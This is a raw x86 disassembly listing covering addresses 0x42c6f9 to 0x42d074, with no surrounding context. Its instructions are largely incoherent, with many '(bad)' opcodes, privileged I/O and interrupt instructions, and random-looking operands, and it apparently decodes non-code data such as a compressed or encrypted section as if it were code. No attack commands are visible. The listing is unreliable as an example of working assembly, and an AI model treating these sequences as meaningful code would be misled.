  42c6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6fa:	or     edi,ebx
  42c6fc:	mov    bh,0x99
  42c6fe:	push   esi
  42c6ff:	sbb    BYTE PTR [edx+0x7c],dh
  42c702:	fisttp QWORD PTR [ebx+0x3d397f6c]
  42c708:	cmc    
  42c709:	stc    
  42c70a:	jo     0x42c759
  42c70c:	iret   
  42c70d:	outs   dx,DWORD PTR ds:[esi]
  42c70e:	jp     0x42c6f9
  42c710:	out    0xb9,eax
  42c712:	(bad)  
  42c713:	loopne 0x42c749
  42c715:	cmp    dl,BYTE PTR [ecx]
  42c717:	leave  
  42c718:	push   edx
  42c719:	call   0x4c575a8c
  42c71e:	pop    esi
  42c71f:	inc    edi
  42c720:	push   0x31
  42c722:	ja     0x42c787
  42c724:	xchg   edx,eax
  42c725:	xor    al,0x96
  42c727:	xchg   dl,ah
  42c729:	pop    esi
  42c72a:	jnp    0x42c752
  42c72c:	std    
  42c72d:	adc    eax,0x119545dc
  42c732:	xchg   esi,eax
  42c733:	dec    edi
  42c734:	aas    
  42c735:	out    0x67,al
  42c737:	arpl   WORD PTR [edi+eiz*8],di
  42c73a:	xor    eax,0xca5b471e
  42c73f:	imul   edi,DWORD PTR [esp+ecx*4+0x504333ea],0x5206923b
  42c74a:	push   eax
  42c74b:	or     BYTE PTR [ebx],0xc1
  42c74e:	sub    ch,dl
  42c750:	aaa    
  42c751:	lds    ebp,FWORD PTR ds:0x3dffe24b
  42c757:	pop    esp
  42c758:	push   ebp
  42c759:	sub    al,0x63
  42c75b:	push   0xffffffa7
  42c75d:	sbb    BYTE PTR [ebp-0x530e235],bl
  42c763:	or     esi,0x44
  42c766:	push   esi
  42c767:	icebp  
  42c768:	test   eax,0xc88e8e87
  42c76d:	pop    eax
  42c76e:	(bad)  
  42c76f:	mov    esi,0x786384a4
  42c774:	mov    ds:0xc234cb63,al
  42c779:	cmp    al,0x71
  42c77b:	sahf   
  42c77c:	out    dx,eax
  42c77d:	test   eax,0x1d0b57fe
  42c782:	repnz jmp 0xa972:0xf6c54466
  42c78a:	popa   
  42c78b:	aad    0x70
  42c78d:	fidivr DWORD PTR [ecx-0x2f]
  42c790:	fild   WORD PTR [eax]
	...
  42c7f2:	add    BYTE PTR [eax],al
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	stos   DWORD PTR es:[edi],eax
  42c801:	mov    al,0x58
  42c803:	sbb    edx,edi
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x32000001,al
  42c80d:	push   eax
  42c80e:	cdq    
  42c80f:	(bad)  
  42c811:	popa   
  42c812:	xor    ebx,edx
  42c814:	stos   BYTE PTR es:[edi],al
  42c815:	in     al,dx
  42c816:	add    DWORD PTR [eax+esi*1+0x4f4d604c],edi
  42c81d:	cmpxchg ebx,esi
  42c820:	out    dx,al
  42c821:	jo     0x42c7a4
  42c823:	iret   
  42c824:	out    dx,al
  42c825:	ss mov bl,0xbe
  42c828:	xor    al,0x1f
  42c82a:	sub    DWORD PTR [esp+ebx*1+0x76669ecb],edx
  42c831:	mov    dh,0xcf
  42c833:	cmp    ebp,DWORD PTR [edi+ecx*2+0x59]
  42c837:	iret   
  42c838:	ins    BYTE PTR es:[edi],dx
  42c839:	das    
  42c83a:	mov    bh,0xe7
  42c83c:	cmp    ecx,DWORD PTR [esi+0x3d]
  42c83f:	inc    ebp
  42c840:	cmc    
  42c841:	stos   BYTE PTR es:[edi],al
  42c842:	out    0x83,al
  42c844:	hlt    
  42c845:	sti    
  42c846:	frstor [edx-0xc7866b7]
  42c84c:	shl    BYTE PTR [ecx*8-0x7561a79b],cl
  42c853:	shl    BYTE PTR [esi+0x4d],1
  42c856:	rol    BYTE PTR [ecx],cl
  42c858:	adc    eax,DWORD PTR [ebx+ebx*2-0x32]
  42c85c:	stos   DWORD PTR es:[edi],eax
  42c85d:	mov    ebp,0x7792cfd2
  42c862:	(bad)  
  42c863:	xor    eax,ebx
  42c865:	ret    
  42c866:	jo     0x42c843
  42c868:	in     al,0xe0
  42c86a:	mov    eax,ds:0x4ff15970
  42c86f:	std    
  42c870:	push   edi
  42c871:	add    al,0x63
  42c873:	aad    0x9d
  42c875:	dec    edi
  42c876:	les    ebp,FWORD PTR [ecx-0x3b]
  42c879:	sub    BYTE PTR [esi+0x77e47813],dh
  42c87f:	mov    cs,ebp
  42c881:	lods   eax,DWORD PTR ds:[esi]
  42c882:	std    
  42c883:	test   DWORD PTR [eax+0x16],edx
  42c886:	push   ecx
  42c887:	and    al,0x6d
  42c889:	gs pop ss
  42c88b:	mov    WORD PTR [ebp+0x473f6ca4],?
  42c891:	push   ecx
  42c892:	imul   esi,DWORD PTR [ebx+0x52],0xffffffef
  42c896:	je     0x42c8d6
  42c898:	mov    esi,0xa570c3fc
  42c89d:	or     eax,0x32949e2d
  42c8a2:	inc    eax
  42c8a3:	mov    cl,0xc8
  42c8a5:	cmp    al,0xda
  42c8a7:	pop    edi
  42c8a8:	push   0xffffffbd
  42c8aa:	mov    esp,0xc2021e80
  42c8af:	pop    eax
  42c8b0:	fprem  
  42c8b2:	arpl   WORD PTR [ebp+0x1765454a],cx
  42c8b8:	cmp    ebp,DWORD PTR [edx+edi*2]
  42c8bb:	pop    eax
  42c8bc:	add    al,0x11
  42c8be:	and    eax,0x1fd3ba65
  42c8c3:	or     edx,ebp
  42c8c5:	mov    cl,0x6f
  42c8c7:	sti    
  42c8c8:	xlat   BYTE PTR ds:[ebx]
  42c8c9:	and    BYTE PTR [ebx+ebx*8+0xe],bl
  42c8cd:	pop    eax
  42c8ce:	lahf   
  42c8cf:	add    ch,BYTE PTR [ebx]
  42c8d1:	ja     0x42c932
  42c8d3:	push   ecx
  42c8d4:	inc    ecx
  42c8d5:	xor    al,0xe7
  42c8d7:	mov    al,al
  42c8d9:	sbb    al,0x71
  42c8db:	sbb    eax,0x1b77ee95
  42c8e0:	push   edx
  42c8e1:	rcr    BYTE PTR [eax+0x40d09cd1],0x12
  42c8e8:	mov    BYTE PTR es:[ecx+0x278da487],ah
  42c8ef:	xchg   ecx,eax
  42c8f0:	add    DWORD PTR [ebx+0x4e],esp
  42c8f3:	sbb    al,0x96
  42c8f5:	icebp  
  42c8f6:	mov    ebx,0xa8f5ce15
  42c8fb:	xchg   ebp,eax
  42c8fc:	fld    DWORD PTR [ecx-0x4a5d8d04]
  42c902:	adc    BYTE PTR [ebx+0x2f],0x37
  42c906:	das    
  42c907:	mov    ecx,0xffbbe212
  42c90c:	push   edx
  42c90d:	lods   eax,DWORD PTR gs:[esi]
  42c90f:	mov    ch,BYTE PTR [eax+eax*1+0x0]
	...
  42c972:	add    BYTE PTR [eax],al
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xd982bd0a
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0xb000001,al
  42c98d:	adc    eax,0xb617f6c2
  42c992:	xchg   esi,eax
  42c993:	push   ss
  42c994:	out    0xa4,eax
  42c996:	jg     0x42c9a2
  42c998:	inc    eax
  42c999:	ins    DWORD PTR es:[edi],dx
  42c99a:	xchg   esp,eax
  42c99b:	bound  edi,QWORD PTR [ebp+0x419a43b1]
  42c9a1:	jae    0x42c92b
  42c9a3:	cmp    edx,DWORD PTR [edx+0x13]
  42c9a6:	dec    ebx
  42c9a7:	(bad)  
  42c9a9:	ret    
  42c9aa:	push   esp
  42c9ab:	mov    ebp,0xd96e5802
  42c9b0:	lods   al,BYTE PTR ds:[esi]
  42c9b1:	inc    edi
  42c9b2:	les    edx,FWORD PTR [edx+0x702ca601]
  42c9b8:	js     0x42ca04
  42c9ba:	arpl   WORD PTR [ebp+0xe],di
  42c9bd:	jecxz  0x42c9fd
  42c9bf:	jl     0x42ca12
  42c9c1:	mov    ?,esi
  42c9c3:	and    BYTE PTR [ebp+0x2afc7d10],0xb7
  42c9ca:	loope  0x42c9bf
  42c9cc:	mov    edi,0x9172da4a
  42c9d1:	cmp    DWORD PTR [ecx],eax
  42c9d3:	adc    al,0xf3
  42c9d5:	repnz mov al,0x91
  42c9d8:	push   esi
  42c9d9:	dec    ecx
  42c9da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9db:	in     eax,0x14
  42c9dd:	add    eax,0x3ffffc66
  42c9e2:	cmc    
  42c9e3:	(bad)  
  42c9e4:	cld    
  42c9e5:	aad    0x43
  42c9e7:	pushf  
  42c9e8:	icebp  
  42c9e9:	sub    al,0x99
  42c9eb:	pushf  
  42c9ec:	add    eax,0xbf9b9c6
  42c9f1:	mov    fs,WORD PTR [edi-0x73bff86e]
  42c9f7:	icebp  
  42c9f8:	popf   
  42c9f9:	or     cl,BYTE PTR [ebx+0x6eb188b5]
  42c9ff:	push   0x25577569
  42ca04:	cdq    
  42ca05:	call   FWORD PTR [esi+edx*2+0x3f]
  42ca09:	sbb    DWORD PTR [edi-0x6fe1f470],ebx
  42ca0f:	rcr    DWORD PTR [edx+0x1],0xb3
  42ca13:	fmul   DWORD PTR [ebp+0x6]
  42ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca17:	call   0x3f46e359
  42ca1c:	sbb    al,0x2f
  42ca1e:	mov    WORD PTR [edi-0xfa48d67],cs
  42ca24:	xchg   edx,eax
  42ca25:	enter  0x9823,0xb0
  42ca29:	aas    
  42ca2a:	iret   
  42ca2b:	fwait
  42ca2c:	in     eax,0x8
  42ca2e:	ret    0x8b65
  42ca31:	test   BYTE PTR [eax],dl
  42ca33:	(bad)  
  42ca34:	jns    0x42ca6a
  42ca36:	out    dx,al
  42ca37:	add    dl,BYTE PTR [edx]
  42ca39:	test   edi,0x5dc0d507
  42ca3f:	stos   BYTE PTR es:[edi],al
  42ca40:	jle    0x42ca4c
  42ca42:	mov    edi,ds
  42ca44:	xor    eax,0xc7cb8c1f
  42ca49:	js     0x42ca9e
  42ca4b:	cmp    esp,DWORD PTR [eax+edx*8+0x50cd2fc8]
  42ca52:	(bad)  
  42ca53:	clc    
  42ca54:	iret   
  42ca55:	xor    BYTE PTR [ecx],dh
  42ca57:	add    eax,0x35f8338d
  42ca5c:	sub    BYTE PTR [esi+ebx*4-0x7e2421d2],0xb
  42ca64:	push   ecx
  42ca65:	popf   
  42ca66:	in     al,0x85
  42ca68:	sbb    ebp,eax
  42ca6a:	jns    0x42ca9e
  42ca6c:	xchg   bl,bl
  42ca6e:	jge    0x42cad3
  42ca70:	scas   eax,DWORD PTR es:[edi]
  42ca71:	jne    0x42cac2
  42ca73:	mov    bh,0xc
  42ca75:	xlat   BYTE PTR ds:[ebx]
  42ca76:	mov    eax,ds:0xd5cb088d
  42ca7b:	or     DWORD PTR [ecx+edi*2],edi
  42ca7e:	mov    esi,0x3ff03394
  42ca83:	enter  0x8863,0xf
  42ca87:	dec    ebp
  42ca88:	jmp    0x4232c2a
  42ca8d:	or     eax,DWORD PTR [eax+0x99c6]
	...
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x65089140]
  42cb02:	jp     0x42cb6a
  42cb04:	add    al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0xb8000001
  42cb0d:	pop    esp
  42cb0e:	mov    dh,0xc3
  42cb10:	pop    ebp
  42cb11:	sbb    BYTE PTR [ebx+0x1b],al
  42cb14:	shr    esi,1
  42cb16:	(bad)
  42cb1a:	push   eax
  42cb1b:	sbb    ch,cl
  42cb1d:	add    esp,eax
  42cb1f:	add    DWORD PTR [ebx+0x7a],ecx
  42cb22:	aad    0x97
  42cb24:	mov    esp,0xc6aaee5e
  42cb29:	scas   eax,DWORD PTR es:[edi]
  42cb2a:	fldenv [ecx]
  42cb2c:	pop    ebx
  42cb2d:	iret   
  42cb2e:	jae    0x42cb9f
  42cb30:	add    DWORD PTR [ecx+eax*4],0xfffffff4
  42cb34:	jp     0x42cb39
  42cb36:	or     cl,cl
  42cb38:	mov    dl,0xf9
  42cb3a:	and    eax,DWORD PTR [esi-0x5d2eef01]
  42cb40:	(bad)  
  42cb41:	jp     0x42cbb4
  42cb43:	sbb    ch,bh
  42cb45:	and    dl,dh
  42cb47:	jge    0x42cb7d
  42cb49:	adc    BYTE PTR [ecx],dh
  42cb4b:	or     BYTE PTR [eax-0x59],ah
  42cb4e:	rcr    cl,0x44
  42cb51:	in     al,0x1e
  42cb53:	outs   dx,DWORD PTR ds:[esi]
  42cb54:	dec    ebp
  42cb55:	mov    ch,0xd1
  42cb57:	push   ebx
  42cb58:	pop    esi
  42cb59:	icebp  
  42cb5a:	pop    es
  42cb5b:	pop    eax
  42cb5c:	lahf   
  42cb5d:	mov    ?,WORD PTR [ebx+eiz*2+0x11]
  42cb61:	sbb    BYTE PTR [ecx],ah
  42cb63:	push   edx
  42cb64:	cmp    ebx,DWORD PTR [esi-0x52]
  42cb67:	mov    esp,0x7af037dc
  42cb6c:	lods   al,BYTE PTR ds:[esi]
  42cb6d:	sbb    edx,esi
  42cb6f:	enter  0xf136,0x8d
  42cb73:	and    esi,esi
  42cb75:	sbb    eax,0xf40b02e4
  42cb7a:	pop    edi
  42cb7b:	lods   eax,DWORD PTR ds:[esi]
  42cb7c:	(bad)  
  42cb7d:	fcmovnb st,st(3)
  42cb7f:	and    DWORD PTR [eax+0x48c608b],edx
  42cb85:	jns    0x42cb37
  42cb87:	and    edi,esi
  42cb89:	sahf   
  42cb8a:	mov    ebp,0x37be12e7
  42cb8f:	(bad)  
  42cb91:	out    dx,eax
  42cb92:	jp     0x42cb6e
  42cb94:	mov    dl,ah
  42cb96:	mov    eax,ds:0x72bbd4e6
  42cb9b:	push   esi
  42cb9c:	dec    edx
  42cb9d:	mov    dh,0xed
  42cb9f:	mov    ah,al
  42cba1:	loopne 0x42cb7d
  42cba3:	cwde   
  42cba4:	xchg   edi,eax
  42cba5:	inc    esi
  42cba6:	mov    ds:0x45feb64b,al
  42cbab:	mov    bh,BYTE PTR [ecx+0x7b]
  42cbae:	and    eax,0xc00eda1d
  42cbb3:	sub    al,0xb4
  42cbb5:	cmc    
  42cbb6:	cli    
  42cbb7:	jno    0x42cb46
  42cbb9:	xchg   edi,eax
  42cbba:	sti    
  42cbbb:	pop    es
  42cbbc:	int    0xec
  42cbbe:	clc    
  42cbbf:	jbe    0x42cb52
  42cbc1:	jnp    0x42cb85
  42cbc3:	out    dx,al
  42cbc4:	jp     0x42cc30
  42cbc6:	into   
  42cbc7:	pop    ds
  42cbc8:	sti    
  42cbc9:	pop    ss
  42cbca:	inc    eax
  42cbcb:	ins    BYTE PTR es:[edi],dx
  42cbcc:	mov    edx,0x95e24e1b
  42cbd1:	mov    dh,0xfb
  42cbd3:	inc    ecx
  42cbd4:	fwait
  42cbd5:	push   ebp
  42cbd6:	adc    DWORD PTR [ecx-0x10d0dc93],edx
  42cbdc:	push   ss
  42cbdd:	lds    edx,FWORD PTR [eax+0x8d8c9b5]
  42cbe3:	pop    ds
  42cbe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cbe5:	add    DWORD PTR [edx+0x3258e72c],eax
  42cbeb:	xchg   ebx,eax
  42cbec:	mov    esi,0x68e20d89
  42cbf1:	in     eax,dx
  42cbf2:	or     DWORD PTR [esi+0x420f3ea3],ebp
  42cbf8:	shl    BYTE PTR [esi+0x38],0x98
  42cbfc:	mov    esp,ss
  42cbfe:	mov    edx,0x4ff4de97
  42cc03:	mov    eax,ds:0xfb4201cc
  42cc08:	push   ss
  42cc09:	dec    esp
  42cc0a:	mov    edx,0xccbdd7a0
  42cc0f:	or     ah,0x0
	...
  42cc72:	add    BYTE PTR [eax],al
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xccdda6fe
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xc9000001
  42cc8d:	add    esp,ebx
  42cc8f:	(bad)
  42cc92:	ror    DWORD PTR [eax+0x5c2d6d7c],0x1c
  42cc99:	mov    bh,0xb1
  42cc9b:	test   BYTE PTR [ebx-0x5],ah
  42cc9e:	pop    edi
  42cc9f:	je     0x42ccce
  42cca1:	fst    DWORD PTR [ebp+0x2e30f698]
  42cca7:	in     al,dx
  42cca8:	js     0x42ccf9
  42ccaa:	pop    edi
  42ccab:	xchg   ebx,eax
  42ccac:	pop    eax
  42ccad:	(bad)  
  42ccae:	cmp    ebx,eax
  42ccb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ccb1:	mov    eax,0x9fcb9ce4
  42ccb6:	ins    BYTE PTR es:[edi],dx
  42ccb7:	push   eax
  42ccb8:	adc    al,bh
  42ccba:	mov    al,0x9a
  42ccbc:	daa    
  42ccbd:	mov    esi,0xabcbd50e
  42ccc2:	imul   al
  42ccc4:	adc    al,0xfd
  42ccc6:	dec    ecx
  42ccc7:	mov    WORD PTR [ebp-0x167881ed],?
  42cccd:	popf   
  42ccce:	dec    esp
  42cccf:	bswap  ebx
  42ccd1:	adc    eax,0xd998879d
  42ccd6:	mov    ebp,0xff62442b
  42ccdb:	pop    esp
  42ccdc:	jmp    FWORD PTR [ecx-0x5f]
  42ccdf:	add    edi,ebx
  42cce1:	jge    0x42ccbd
  42cce3:	sub    bh,BYTE PTR [ebx]
  42cce5:	sub    DWORD PTR [ecx],esp
  42cce7:	fidivr DWORD PTR [ebx-0xb8fdaa1]
  42cced:	fisub  DWORD PTR [edx-0x3]
  42ccf0:	xchg   ecx,eax
  42ccf1:	aad    0x5a
  42ccf3:	sub    DWORD PTR [edx],0x2f8f4994
  42ccf9:	out    dx,al
  42ccfa:	int3   
  42ccfb:	pop    eax
  42ccfc:	cld    
  42ccfd:	lds    ecx,FWORD PTR [ecx+0x15]
  42cd00:	mov    eax,0xcd5dcefb
  42cd05:	inc    esp
  42cd06:	or     al,0x96
  42cd08:	fsubr  QWORD PTR ds:[ecx-0x6f]
  42cd0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd0d:	lock hlt 
  42cd0f:	jl     0x42cc91
  42cd11:	test   DWORD PTR [eax+0x46],esp
  42cd14:	sub    al,0xec
  42cd16:	mov    ds:0xdb3525e0,al
  42cd1b:	int3   
  42cd1c:	jae    0x42ccb2
  42cd1e:	sbb    cl,BYTE PTR [edi+0x39]
  42cd21:	dec    esp
  42cd22:	ins    BYTE PTR es:[edi],dx
  42cd23:	cmp    al,0x5b
  42cd26:	push   0xffffff97
  42cd28:	xor    DWORD PTR [eax+0x10],esp
  42cd2b:	repnz rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd2e:	test   al,0x2a
  42cd30:	aad    0xd8
  42cd32:	(bad)  
  42cd33:	lods   al,BYTE PTR ds:[esi]
  42cd34:	(bad)  
  42cd35:	in     eax,dx
  42cd36:	cmp    ebx,DWORD PTR [ebp-0x4a]
  42cd39:	cli    
  42cd3a:	(bad)  
  42cd3b:	(bad)  
  42cd3c:	mov    ds:0xba415179,eax
  42cd41:	mov    ds,WORD PTR [esp+ebp*4-0x71bdcd39]
  42cd48:	cwde   
  42cd49:	pop    ebp
  42cd4a:	pop    edx
  42cd4b:	mov    esp,0x6c59dd37
  42cd50:	addr16 je 0x42cdc4
  42cd53:	test   al,0xa9
  42cd55:	rcr    DWORD PTR [ecx+0x39577440],0x88
  42cd5c:	xchg   ecx,eax
  42cd5d:	mov    DWORD PTR [eax-0x7b8198db],ebx
  42cd63:	mov    ds:0x9f8a3638,eax
  42cd68:	rol    BYTE PTR [ebx],1
  42cd6a:	dec    ebp
  42cd6b:	jg     0x42cd41
  42cd6d:	mov    ecx,0xe831db9c
  42cd72:	add    ah,cl
  42cd74:	inc    edi
  42cd75:	lock and edx,DWORD PTR [esi+edx*1]
  42cd79:	rep outs dx,BYTE PTR ds:[esi]
  42cd7b:	jg     0x42ccfd
  42cd7d:	aaa    
  42cd7e:	inc    esp
  42cd7f:	lods   eax,DWORD PTR ds:[esi]
  42cd80:	cli    
  42cd81:	inc    ecx
  42cd82:	jb     0x42cdd9
  42cd84:	inc    edx
  42cd85:	inc    edx
  42cd86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd87:	push   cs
  42cd88:	jae    0x42cd80
  42cd8a:	add    eax,0xaf2f1386
  42cd8f:	leave  
  42cd90:	mov    es,WORD PTR [eax]
	...
  42cdf2:	add    BYTE PTR [eax],al
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x6d
  42ce01:	data16 stos BYTE PTR es:[edi],al
  42ce03:	popf   
  42ce04:	push   cs
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x59000001,al
  42ce0d:	adc    esp,eax
  42ce0f:	pop    esi
  42ce10:	imul   esp,DWORD PTR [ebp+ecx*4-0x65df29ce],0xffffffce
  42ce18:	mov    al,ds:0x463ccf38
  42ce1d:	mov    cs:0x9735374a,al
  42ce23:	xor    bh,al
  42ce25:	test   esi,ecx
  42ce27:	sbb    eax,esi
  42ce29:	fnstcw WORD PTR ds:0xd91e1d61
  42ce2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce30:	bound  edx,QWORD PTR [ecx]
  42ce32:	push   esi
  42ce33:	mov    esi,0xe48ddad4
  42ce38:	pop    ss
  42ce39:	loop   0x42cdbb
  42ce3b:	and    ah,BYTE PTR [edi+0x6b]
  42ce3e:	cmp    dh,BYTE PTR [esi]
  42ce40:	cld    
  42ce41:	jge    0x42ce46
  42ce43:	popf   
  42ce44:	push   ecx
  42ce45:	aam    0x86
  42ce47:	rcl    dl,cl
  42ce49:	out    dx,al
  42ce4a:	mov    BYTE PTR [eax+0x2e3de384],ch
  42ce50:	(bad)  
  42ce51:	xchg   ecx,eax
  42ce52:	xchg   edi,eax
  42ce53:	sbb    eax,0xb5930d66
  42ce58:	stos   DWORD PTR es:[edi],eax
  42ce59:	jne    0x42cdfd
  42ce5b:	fist   DWORD PTR [edi+0x3a]
  42ce5e:	mov    edx,DWORD PTR [ecx-0x1f]
  42ce61:	xor    al,0x1
  42ce63:	std    
  42ce64:	std    
  42ce65:	lods   eax,DWORD PTR ds:[esi]
  42ce66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce67:	dec    edx
  42ce68:	xlat   BYTE PTR ds:[ebx]
  42ce69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce6a:	sub    DWORD PTR [edi-0x3f7a9810],0x14283c50
  42ce74:	and    eax,0x9106256a
  42ce79:	addr16 mov edx,0x546d9d57
  42ce7f:	xor    BYTE PTR [ecx],ch
  42ce81:	mov    eax,ds:0x63f05c6a
  42ce86:	and    al,0x5
  42ce88:	sub    ebx,DWORD PTR [esi+0x1c]
  42ce8b:	nop
  42ce8c:	(bad)  
  42ce8d:	mov    ds:0xea2b32e3,eax
  42ce92:	push   ss
  42ce93:	sub    DWORD PTR [edi-0x370a6f1a],ebp
  42ce99:	push   ecx
  42ce9a:	adc    al,0x69
  42ce9c:	fbld   TBYTE PTR [edx]
  42ce9e:	lods   al,BYTE PTR ds:[esi]
  42ce9f:	or     cl,al
  42cea1:	xchg   esi,eax
  42cea2:	test   DWORD PTR [edi+0x42],esp
  42cea5:	inc    ebx
  42cea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cea7:	stos   DWORD PTR es:[edi],eax
  42cea8:	mov    eax,0xb23557ee
  42cead:	cdq    
  42ceae:	shr    BYTE PTR [ecx],1
  42ceb0:	and    ebx,esi
  42ceb2:	mov    dl,0xd
  42ceb4:	add    eax,0xd4ea9e59
  42ceb9:	jb     0x42cecc
  42cebb:	pop    es
  42cebc:	cwde   
  42cebd:	ins    BYTE PTR es:[edi],dx
  42cebe:	add    DWORD PTR [eax-0x25c08202],esp
  42cec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cec5:	fisubr WORD PTR ss:[esi-0x7b]
  42cec9:	mov    ch,0xdd
  42cecb:	mov    ds:0x1d4362cb,eax
  42ced0:	rcl    DWORD PTR [edx+0x58f2d119],0xc5
  42ced7:	sar    BYTE PTR [ebp+ebx*4-0x64e0c982],0x41
  42cedf:	add    eax,0x380a5a43
  42cee4:	and    ah,BYTE PTR [edx]
  42cee6:	push   ds
  42cee7:	cld    
  42cee8:	mov    WORD PTR [ecx+0x1aef6f0e],ss
  42ceee:	adc    al,BYTE PTR [ecx+0x7c31ded9]
  42cef4:	(bad)  
  42cef5:	pop    ecx
  42cef6:	test   eax,0x7b847bd1
  42cefb:	mov    eax,0x225ecba3
  42cf00:	or     BYTE PTR [edx+0x75625a00],dh
  42cf06:	inc    esi
  42cf07:	inc    ebx
  42cf08:	sbb    bl,BYTE PTR [ebp+0x7816a909]
  42cf0e:	jno    0x42ce9d
  42cf10:	fld    DWORD PTR [eax]
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    ebp,FWORD PTR [ebx-0x48]
  42cf82:	ja     0x42cf58
  42cf84:	adc    esp,edx
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    eax,0x3b000001
  42cf8d:	dec    edx
  42cf8e:	mov    ch,0x9e
  42cf90:	jge    0x42cf8d
  42cf92:	fdiv   QWORD PTR [ebx]
  42cf94:	xor    DWORD PTR [ebp-0x3951323b],ebp
  42cf9a:	xlat   BYTE PTR ds:[ebx]
  42cf9b:	jae    0x42cf66
  42cf9d:	lods   eax,DWORD PTR ds:[esi]
  42cf9e:	and    DWORD PTR [esi+0x155930b0],0xea772cbe
  42cfa8:	inc    edx
  42cfa9:	sub    DWORD PTR [esi],ebp
  42cfab:	int3   
  42cfac:	jno    0x42d01f
  42cfae:	and    BYTE PTR [ebx],al
  42cfb0:	jmp    0x3a7d98e
  42cfb5:	lods   al,BYTE PTR ds:[esi]
  42cfb6:	iret   
  42cfb7:	xchg   edx,eax
  42cfb8:	jmp    0x42d00c
  42cfba:	cwde   
  42cfbb:	lock jo 0x42cf3f
  42cfbe:	into   
  42cfbf:	mov    al,0x78
  42cfc1:	xchg   edi,eax
  42cfc2:	test   eax,0xfb5be6d0
  42cfc7:	mov    eax,ds:0xad75c3e3
  42cfcc:	ds push 0xffffffe2
  42cfcf:	lock pop es
  42cfd1:	arpl   WORD PTR [ebx-0x370e77eb],di
  42cfd7:	jae    0x42d018
  42cfd9:	(bad)  
  42cfda:	cmp    eax,0xf93d69d4
  42cfdf:	clc    
  42cfe0:	mov    ch,0x53
  42cfe2:	aad    0xc0
  42cfe4:	fucom  st(4)
  42cfe6:	mov    BYTE PTR [edi+0x3a],dh
  42cfe9:	pop    es
  42cfea:	or     DWORD PTR [ecx+0x54cdaf62],eax
  42cff0:	sbb    dl,0xf8
  42cff3:	push   0xbb9d2592
  42cff8:	mov    ecx,0xed42564d
  42cffd:	aad    0xe4
  42cfff:	das    
  42d000:	loope  0x42cffc
  42d002:	or     ch,BYTE PTR [ecx+0x7b]
  42d005:	fstp   QWORD PTR [edi]
  42d007:	xchg   esi,eax
  42d008:	outs   dx,BYTE PTR ds:[esi]
  42d009:	jmp    0x42cfa4
  42d00b:	lahf   
  42d00c:	rol    ah,0x1d
  42d00f:	das    
  42d010:	adc    eax,0xb48d7fa4
  42d015:	popa   
  42d016:	mov    al,ds:0x63b9bd8b
  42d01b:	mov    ecx,ds
  42d01d:	xlat   BYTE PTR ds:[ebx]
  42d01e:	pcmpgtb mm5,mm4
  42d021:	dec    edx
  42d022:	es iret 
  42d024:	xlat   BYTE PTR ds:[ebx]
  42d025:	int3   
  42d026:	cwde   
  42d027:	rol    cl,1
  42d029:	pop    esp
  42d02a:	lahf   
  42d02b:	jno    0x42d049
  42d02d:	sub    esp,DWORD PTR [esi-0x7c]
  42d030:	sub    eax,0x699fcdfa
  42d035:	dec    esp
  42d036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d037:	(bad)  
  42d038:	pop    eax
  42d039:	mov    ch,0x15
  42d03b:	int3   
  42d03c:	and    al,0xd3
  42d03e:	aam    0x4c
  42d040:	and    ebx,DWORD PTR [edx+0x28de0869]
  42d046:	int    0x65
  42d048:	cmp    al,BYTE PTR [esi+0x4e]
  42d04b:	ret    
  42d04c:	xchg   ebx,eax
  42d04d:	sbb    al,0xfe
  42d04f:	je     0x42d047
  42d051:	mov    al,ds:0x2344ba7f
  42d056:	and    al,BYTE PTR [ebx+0x3ffe4cb1]
  42d05c:	cld    
  42d05d:	xor    esp,DWORD PTR [ebx]
  42d05f:	mov    WORD PTR [esi+0x5],es
  42d062:	cs cs test eax,0x16cb1b40
  42d069:	jo     0x42d0d3
  42d06b:	mov    al,0x67
  42d06d:	(bad)  
  42d06e:	data16 (bad) 
  42d070:	fxch   st(1)
  42d072:	pop    ecx
  42d073:	push   ecx
  42d074:	mov    ds:0x73bed2fb,al
